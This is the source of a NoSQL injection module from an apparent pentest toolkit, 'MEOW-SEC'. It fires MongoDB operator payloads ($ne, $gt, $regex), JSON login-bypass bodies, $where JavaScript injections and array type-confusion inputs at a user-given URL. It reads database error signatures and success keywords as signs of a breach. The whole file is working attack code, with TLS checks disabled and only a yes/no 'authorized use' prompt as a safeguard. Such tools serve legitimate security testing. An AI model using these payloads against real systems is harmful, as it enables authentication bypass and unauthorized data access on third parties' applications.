# -*- coding: utf-8 -*-
"""MEOW-SEC :: NOSQLI — NoSQL Injection Tester (MongoDB, Redis, CouchDB)"""
import os, re, json
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_FOUND
from rich.panel  import Panel
from rich.table  import Table
from rich.prompt import Prompt, Confirm
from rich.rule   import Rule
from rich        import box

try:
    import requests as _req
    _req.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

_UA      = "MEOW-NOSQLI/1.0 (authorized-test)"
_TIMEOUT = 10

# ─── SIGNATURES D'ERREURS NOSQL ──────────────────────────────

_NOSQL_ERRORS = {
    "MongoDB":  ["mongod", "mongodb", "mongoose", "bson", "objectid",
                 "cast to objectid", "e11000 duplicate", "queryfailed",
                 "$where", "document failed validation", "mquery"],
    "Redis":    ["redis", "err wrong number", "wrongtype operation",
                 "redisexception", "jedis", "ioredis"],
    "CouchDB":  ["couchdb", "bad_request", "invalid_json",
                 "document_id_too_large"],
    "Generic":  ["nosql", "json parse error", "unexpected token",
                 "syntax error in query", "invalid query"],
}

# ─── OPERATOR INJECTION (MongoDB) ────────────────────────────

_OPERATORS = [
    ({"$ne": "invalid_xyz"},     "$ne",     "Not-equal bypass"),
    ({"$gt": ""},                "$gt",     "Greater-than empty"),
    ({"$gte": ""},               "$gte",    "Greater-than-equal"),
    ({"$lt": "zzzzz"},          "$lt",     "Less-than zzzzz"),
    ({"$nin": ["invalid_xyz"]},  "$nin",    "Not-in array"),
    ({"$regex": ".*"},           "$regex",  "Regex wildcard"),
    ({"$regex": "^"},            "$regex^", "Regex always-true"),
    ({"$exists": True},          "$exists", "Field exists"),
    ({"$ne": None},              "$ne null","Not-null"),
    ({"$type": 2},               "$type",   "Type 2 = string"),
]

# ─── AUTH BYPASS JSON (MongoDB) ──────────────────────────────

_AUTH_BYPASS_JSON = [
    {"username": {"$ne": None},    "password": {"$ne": None}},
    {"username": {"$gt": ""},      "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": "admin",          "password": {"$ne": "wrongpass"}},
    {"username": {"$in": ["admin", "administrator", "root", "superuser"]},
     "password": {"$ne": "x"}},
    {"$where": "function() { return true; }"},
    {"username": "admin", "password": {"$gt": ""}},
]

# ─── WHERE INJECTION (JavaScript dans MongoDB) ───────────────

_WHERE_PAYLOADS = [
    "'; return true; var a='",
    "function() { return true; }",
    "1; return 1==1",
    "'; sleep(1000); return true; var a='",
    "this.username.match(/.*/) || true",
]

# ─── ARRAY INJECTION ─────────────────────────────────────────

_ARRAY_PAYLOADS = [
    [""],
    ["1"],
    ["' OR '1'='1"],
    ["1", "2"],
    [None],
]

# ─── INDICATEURS DE SUCCÈS (auth bypass) ─────────────────────

_SUCCESS_INDICATORS = [
    "dashboard", "welcome", "logout", "profile", "account",
    "token", "jwt", "session", "success", "200 ok",
    "admin", "logged in", "authenticated", "user",
]

# ─── HELPERS HTTP ────────────────────────────────────────────

def _get(url, params=None):
    try:
        return _req.get(url, params=params, verify=False, timeout=_TIMEOUT,
                        allow_redirects=True, proxies=_px(),
                        headers={"User-Agent": _UA})
    except Exception:
        return None


def _post_json(url, data):
    try:
        return _req.post(url, json=data, verify=False, timeout=_TIMEOUT,
                         allow_redirects=True, proxies=_px(),
                         headers={"User-Agent": _UA,
                                  "Content-Type": "application/json"})
    except Exception:
        return None


def _post_form(url, data):
    try:
        return _req.post(url, data=data, verify=False, timeout=_TIMEOUT,
                         allow_redirects=True, proxies=_px(),
                         headers={"User-Agent": _UA})
    except Exception:
        return None


def _check_error(text):
    text_low = text.lower()
    for db, sigs in _NOSQL_ERRORS.items():
        for sig in sigs:
            if sig in text_low:
                return db, sig
    return None, None


def _check_success(r):
    if not r:
        return None
    body = r.text.lower()
    if r.status_code in (200, 302, 301):
        for ind in _SUCCESS_INDICATORS:
            if ind in body:
                return ind
    return None


def _inject_get_param(url, param, op_dict):
    """Construit ?param[$ne]=val pour GET."""
    flat = {}
    for op_key, op_val in op_dict.items():
        if isinstance(op_val, list):
            flat[f"{param}[{op_key}][]"] = str(op_val[0]) if op_val else ""
        elif isinstance(op_val, bool):
            flat[f"{param}[{op_key}]"] = "true" if op_val else "false"
        elif isinstance(op_val, int):
            flat[f"{param}[{op_key}]"] = str(op_val)
        else:
            flat[f"{param}[{op_key}]"] = op_val if op_val is not None else ""
    return flat


# ─── TECHNIQUES DE TEST ──────────────────────────────────────

def _test_operator_get(url, param):
    """Operator injection via GET params."""
    findings = []
    for op_dict, op_name, op_desc in _OPERATORS:
        flat_params = _inject_get_param(url, param, op_dict)
        r = _get(url, params=flat_params)
        if not r:
            continue
        db, sig = _check_error(r.text)
        if db:
            find(f"NoSQLi error [{RD}]{db}[/] on [{CY}]{param}[/] op [{OR}]{op_name}[/] — [{DM}]{sig}[/]")
            findings.append({"param": param, "type": "operator-GET",
                              "db": db, "operator": op_name,
                              "evidence": sig, "severity": "HIGH"})
            continue
        ind = _check_success(r)
        if ind:
            find(f"NoSQLi auth bypass [{RD}]{op_name}[/] on [{CY}]{param}[/] — indicator [{G1}]{ind}[/]")
            findings.append({"param": param, "type": "auth-bypass-GET",
                              "db": "MongoDB", "operator": op_name,
                              "evidence": ind, "severity": "CRITICAL"})
    return findings


def _test_json_bypass(url):
    """Auth bypass via JSON body."""
    findings = []
    for payload in _AUTH_BYPASS_JSON:
        r = _post_json(url, payload)
        if not r:
            continue
        db, sig = _check_error(r.text)
        if db:
            find(f"NoSQLi JSON error [{RD}]{db}[/] — [{OR}]{sig}[/]")
            findings.append({"param": "body", "type": "json-error",
                              "db": db, "operator": "JSON body",
                              "evidence": sig, "severity": "HIGH"})
            break
        ind = _check_success(r)
        if ind:
            find(f"NoSQLi JSON auth bypass — indicator [{G1}]{ind}[/]  payload [{OR}]{str(payload)[:50]}[/]")
            findings.append({"param": "body", "type": "json-auth-bypass",
                              "db": "MongoDB", "operator": "JSON body",
                              "evidence": ind, "severity": "CRITICAL"})
            return findings
    return findings


def _test_array_injection(url, param, method="GET", post_data=None):
    """Array type confusion."""
    findings = []
    bl_r = _get(url) if method == "GET" else _post_form(url, post_data or {})
    bl_len = len(bl_r.text) if bl_r else 0

    for arr in _ARRAY_PAYLOADS:
        if method == "GET":
            r = _get(url, params={f"{param}[]": [str(v) if v is not None else "" for v in arr]})
        else:
            d = dict(post_data or {}); d[param] = arr
            r = _post_json(url, d)
        if not r:
            continue
        db, sig = _check_error(r.text)
        if db:
            find(f"Array inject error [{RD}]{db}[/] on [{CY}]{param}[/] — [{OR}]{sig}[/]")
            findings.append({"param": param, "type": "array-injection",
                              "db": db, "operator": "array",
                              "evidence": sig, "severity": "MEDIUM"})
            break
        diff = abs(len(r.text) - bl_len)
        if diff > 200:
            find(f"Array injection length diff on [{CY}]{param}[/] — diff [{G1}]{diff}[/]")
            findings.append({"param": param, "type": "array-injection",
                              "db": "Unknown", "operator": "array",
                              "evidence": f"diff={diff}", "severity": "MEDIUM"})
            break
    return findings


def _test_where_injection(url, param, method="GET", post_data=None):
    """$where JavaScript injection (MongoDB)."""
    findings = []
    for payload in _WHERE_PAYLOADS:
        if method == "GET":
            r = _get(url, params={param: payload})
        else:
            d = dict(post_data or {}); d[param] = payload
            r = _post_json(url, d)
        if not r:
            continue
        db, sig = _check_error(r.text)
        if db:
            find(f"$where inject [{RD}]{db}[/] on [{CY}]{param}[/]")
            findings.append({"param": param, "type": "$where-injection",
                              "db": db, "operator": "$where",
                              "evidence": sig, "severity": "CRITICAL"})
            return findings
        ind = _check_success(r)
        if ind:
            find(f"$where bypass — [{G1}]{ind}[/]")
            findings.append({"param": param, "type": "$where-bypass",
                              "db": "MongoDB", "operator": "$where",
                              "evidence": ind, "severity": "CRITICAL"})
            return findings
    return findings


# ─── SAVE ────────────────────────────────────────────────────

def _save(target, results):
    os.makedirs("data", exist_ok=True)
    slug = re.sub(r"[^a-zA-Z0-9_-]", "_", target)[:40]
    fname = f"data/nosqli_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved → [{CY}]{fname}[/]")


# ─── MAIN ────────────────────────────────────────────────────

def run():
    show_module_banner("nosqli")
    cat_talk(CAT_SCAN, "NoSQL Injection — MongoDB operator bypass, array inject, $where JS", RD)
    console.print()
    warn("AUTHORIZED USE ONLY — Unauthorized testing is illegal.")
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library not available. Run: pip install requests"); return

    url = Prompt.ask(f"  [{G1}]◈ Target URL[/]").strip()
    if not url.startswith("http"):
        url = "https://" + url

    console.print(f"\n  [{G1}][1][/] Operator injection  [{DM}](GET params, ex: ?user[$ne]=x)[/]")
    console.print(f"  [{G1}][2][/] JSON auth bypass    [{DM}](POST body JSON)[/]")
    console.print(f"  [{G1}][3][/] Array injection     [{DM}](type confusion)[/]")
    console.print(f"  [{G1}][4][/] $where JS injection [{DM}](MongoDB JavaScript)[/]")
    console.print(f"  [{G1}][5][/] Toutes les techniques [{DM}](recommandé)[/]")
    mode = ask_choice("Mode", "5")

    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    post_data = {}

    if mode in ("1", "3", "4", "5") and not params:
        param_str = Prompt.ask(f"  [{CY}]◈ Parameter name(s)[/]", default="username").strip()
        params = [p.strip() for p in param_str.split(",")]

    info(f"Target [{CY}]{url}[/]  params {params}")
    console.print()

    all_findings = []

    if mode in ("1", "5"):
        for param in params:
            console.print(Rule(f"[{G1}] OPERATOR INJECTION :: {param}", style=G2))
            info(f"  Operator injection on [{CY}]{param}[/]...")
            findings = _test_operator_get(url, param)
            all_findings.extend(findings)
            if not findings: info(f"  [{DM}]No operator injection[/]")

    if mode in ("2", "5"):
        console.print(Rule(f"[{G1}] JSON AUTH BYPASS", style=G2))
        info("  Testing JSON authentication bypass...")
        findings = _test_json_bypass(url)
        all_findings.extend(findings)
        if not findings: info(f"  [{DM}]No JSON auth bypass[/]")

    if mode in ("3", "5"):
        for param in params:
            console.print(Rule(f"[{G1}] ARRAY INJECTION :: {param}", style=G2))
            info(f"  Array injection on [{CY}]{param}[/]...")
            findings = _test_array_injection(url, param)
            all_findings.extend(findings)
            if not findings: info(f"  [{DM}]No array injection[/]")

    if mode in ("4", "5"):
        for param in params:
            console.print(Rule(f"[{G1}] $WHERE JS INJECTION :: {param}", style=G2))
            info(f"  $where injection on [{CY}]{param}[/]...")
            findings = _test_where_injection(url, param)
            all_findings.extend(findings)
            if not findings: info(f"  [{DM}]No $where injection[/]")

    console.print()

    if all_findings:
        cat_talk(CAT_FOUND, f"{len(all_findings)} NoSQL injection finding(s)!", G1)
        t = Table(title=f"[{G1}]NOSQLI Results[/]", box=box.MINIMAL_DOUBLE_HEAD,
                  border_style=G2, header_style=CY)
        t.add_column("Param",    min_width=12)
        t.add_column("Type",     min_width=20)
        t.add_column("DB",       min_width=10)
        t.add_column("Operator", min_width=14)
        t.add_column("Evidence", min_width=18)
        t.add_column("Severity", min_width=10)
        for f in all_findings:
            sev_c = RD if f["severity"] in ("CRITICAL", "HIGH") else OR
            t.add_row(f["param"], f"[{RD}]{f['type']}[/]", f["db"],
                      f["operator"], f["evidence"][:24],
                      f"[{sev_c}]{f['severity']}[/]")
        console.print(t)
    else:
        ok("No NoSQL injection vulnerabilities detected.")

    _save(url, all_findings)
